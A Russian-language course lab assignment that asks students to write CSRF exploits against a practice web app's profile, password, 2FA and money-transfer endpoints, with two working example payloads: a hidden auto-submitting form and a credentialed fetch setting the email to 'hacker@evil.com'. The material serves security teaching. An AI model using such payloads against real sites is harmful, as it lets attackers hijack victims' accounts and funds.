# CSRF инъекция

Написание CSRF эксплоитов

## Цели работы:

Написать по 1 эксплоиту под каждый эндпоинт (необходимо использовать как JS, так и подход через форму)

### Эндпоинты

- `/update-profile` — Методы: GET, POST — Аутентификация: требуется (session `user_id`) — POST (form): `email`, `phone`, `address`, `bio`

- `/update-preferences` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (form): `status` (по умолчанию `standard`)

- `/change-password` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (form): `new_password`

- `/toggle-2fa` — Метод: POST — Аутентификация: требуется (session `user_id`) — Параметры/тело: нет

- `/transfer` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (form): `amount`, `target_user`, `comment` (опц.)

- `/add-funds` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (form): `amount`

- `/api/update-email` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (JSON): `{ "email": "<email>" }`

- `/api/transfer` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (JSON): `{ "amount": <number>, "target_user": "<username>" }`

## Ресурс

[Сайт](http://5.129.245.211:5000/)

## Сдача

Создайте форк репозитория `websec-lab-csrf-{ваша_фамилия}` в организацию `41ISR`, работайте в ветке `dev`. Удалите содержимое файла `README.md` и работайте в нем же. По завершению работы сделайте пулл реквест `dev` => `main` и отметьте [меня](https://github.com/ktkv419) ревьювером

## Подсказки

- [Презентация](https://ktkv-presentations.github.io/websec-5/)

### Пример эксплоита через форму

```html
<!DOCTYPE html>
<html>
<head>
    <title>...</title>
</head>
<body>
    <form id="csrf-form" 
          action="http://localhost:5000/update-profile" 
          method="POST" 
          style="display:none;">
        <input type="text" name="email" value="ayylmao@r.r">
    </form>
    
    <script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
</body>
</html>

```

### Пример эксплоита через JS

```javascript
        fetch('http://localhost:5000/api/update-email', {
            method: 'POST',
            credentials: 'include', // Отправляет cookies автоматически
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: 'hacker@evil.com'
            })
        }).catch(() => {});
```
